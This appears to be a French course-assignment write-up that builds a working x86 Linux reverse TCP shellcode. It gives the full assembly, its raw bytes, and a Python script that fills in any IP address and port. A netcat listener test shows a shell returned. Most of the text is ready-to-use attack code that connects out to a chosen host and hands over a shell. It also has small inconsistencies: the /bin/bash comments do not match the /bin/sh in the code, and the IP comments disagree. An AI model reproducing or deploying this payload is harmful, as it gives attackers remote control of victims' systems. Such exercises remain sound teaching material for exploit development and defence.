# Assignement 2 #

Dans le cadre du second exercice, il est demande de réaliser un shellcode permettant d'obtenir un shell distant.

L'idée ici est dans un premier temps de créer un socket puis d'établir une connexion en indiquant une adresse IP ainsi qu'un port. Les sorties standard stdin, stdout et stderr sont redirigées afin de pouvoir être utilisées une fois la connexion établie par un shell distant. 

## Création d'un socket ##
La principal référence bibliographique est la documentation des appels systèmes http://man7.org/linux/man-pages/man2/socketcall.2.html. L'appel socketcall est utilisé pour définir les actions sur les sockets en fonction du champ call. La valeur 1 indique que c'est la création d'un socket qui nous interesse. Il s'agit ici d'indiquer un domain, un type et un protocol. Nous prenons le protocol IP de type SOCK_STREAM.

```c
	xor ebx, ebx
	mul ebx
	push ebx
	inc ebx		;socket
	push ebx
	push 0x2
	mov ecx, esp	;*args
	mov al, 0x66
	int 0x80
```
## Création de la connexion ##
Nous procédons de la même manière pour créer la connexion en indiquant l'adresse IP et le port logique. Nous nous sommes appuyé sur la structure sockaddr afin de connaître les différents élément necessaires.

```c
	push 0x0101017f	; @Ip 127.1.1.1
	push dword 0x5c11 ; Port 4444
	inc ebx
    	push word bx      ; Ajout de AF_INET et pour eviter d'avoir un null byte
    	mov ecx, esp	
	push 0x10	; addrlen
	push ecx	; struct *addr
	push edx	; sockfd
	mov bl, 0x3	; connect call
	mov ecx, esp	
	mov al, 0x66
	int 0x80
```

## Redirection ##

Ici, nous redirigeons les 3 sorties vers le socket via l'appel système dup2.

```c
	xor ecx, ecx
	mov cl, 0x2
_:
	mov al, 0x3f
	int 0x80
	dec ecx
	jns _

```

## Exécution du shell ##
Puis enfin, le shell(/bin/bash) est exécuté une fois la connexion établie.

```c
	xor ecx, ecx
	mov edx, ecx
	push edx
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	mov al, 0xb
	int 0x80
```



## Code complet ##

```c
; Shell_reverse_Tcp shellcode
; Author: Alain Menelet
; Taille : 74 bytes
; 2017


global _start

section .text

_start:

	; Création du socket
	; http://man7.org/linux/man-pages/man2/socketcall.2.html
	; int socketcall(int call, unsigned long *args)
	; int socket(int domain, int type, int protocol)
	
	; for domain we use AF_INET(0x2)
	; for type SOCK_STREAM(0x1)
	; for protocol IP (0x0)	

	xor ebx, ebx
	mul ebx
	push ebx
	inc ebx		;socket
	push ebx
	push 0x2
	mov ecx, esp	;*args
	mov al, 0x66
	int 0x80

	; we need to save the result of socket function for later usage

	xchg edx, eax

	; création de la connexion
	; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
	; we save sockfd just before
	; sockaddr structure

	push 0x0101017f	; @Ip 127.0.0.1
	push dword 0x5c11 ; Port 4444
	inc ebx
    push word bx      ; Ajout de AF_INET et pour eviter d'avoir un null byte
    mov ecx, esp	
	push 0x10	; addrlen
	push ecx	; struct *addr
	push edx	; sockfd
	mov bl, 0x3	; connect call
	mov ecx, esp	
	mov al, 0x66
	int 0x80

	
	; redirection des flux via dup
	; nous allons rediriger les sorties standards vers notre socket
	; int dup2(int oldfd, int newfd);

	xor ecx, ecx
	mov cl, 0x2
_:
	mov al, 0x3f
	int 0x80
	dec ecx
	jns _
	

	; execve
	; execute un shell /bin/bash des la connexion réussie

	xor ecx, ecx
	mov edx, ecx
	push edx
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	mov al, 0xb
	int 0x80	

```

## Exécution ##

Sur le premier terminal:
```
./shellcode.c
```

Sur le second terminal: 
```c
nc -l -p 4444 -v
pwd
/home/xophidia
```

## Améliorer la saisie de l'adresse IP et du port ##

Pour cette partie, python s'avère être plus pratique que le C.

```python
#!/usr/bin/env python

import argparse
import struct

def main():
    parser = argparse.ArgumentParser(description="Reverser TCP Shell")
    parser.add_argument('--address', dest="addressIp", default=None, type= str, help="Put your address ip", required=True)
    parser.add_argument('--port', dest="port", default=4444, type=int, help="Put the port", required=True)
    args = parser.parse_args()

    ip = args.addressIp.split('.')
    port = args.port

    shellcode = ("\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x92\x68"+
    struct.pack("!4B",int(ip[0]), int(ip[1]),int(ip[2]), int(ip[3]))+"\x66\x68"+struct.pack("!H",port)+"\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\xb3\x03\x89\xe1\xb0\x66\xcd\x80\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc9\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80");


    print '"' + ''.join('\\x%02x' % ord(c) for c in shellcode) + '";'

if __name__=='__main__':
    main()

```

### Test ###

```c
./reverse_script.py --address 127.1.1.1 --port 1234
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x92\x68\x7f\x01\x01\x01\x66\x68\x04\xd2\x43\x66\x53\x89\xe1\x6a\x10
\x51\x52\xb3\x03\x89\xe1\xb0\x66\xcd\x80\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc9\x89\xca\x52\x68\x2f\x2f\x73\x68\x68
\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80";
````

Nous recompilons comme lors de l'exemple précédent puis testons le tout.

```c
nc -l 127.1.1.1 -p 1234 -v
Listening on [127.1.1.1] (family 0, port 1234)
Connection from [127.0.0.1] port 1234 [tcp/*] accepted (family 2, sport 40102)
id
uid=1000(xophidia) gid=1000(xophidia) groups=1000(xophidia),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```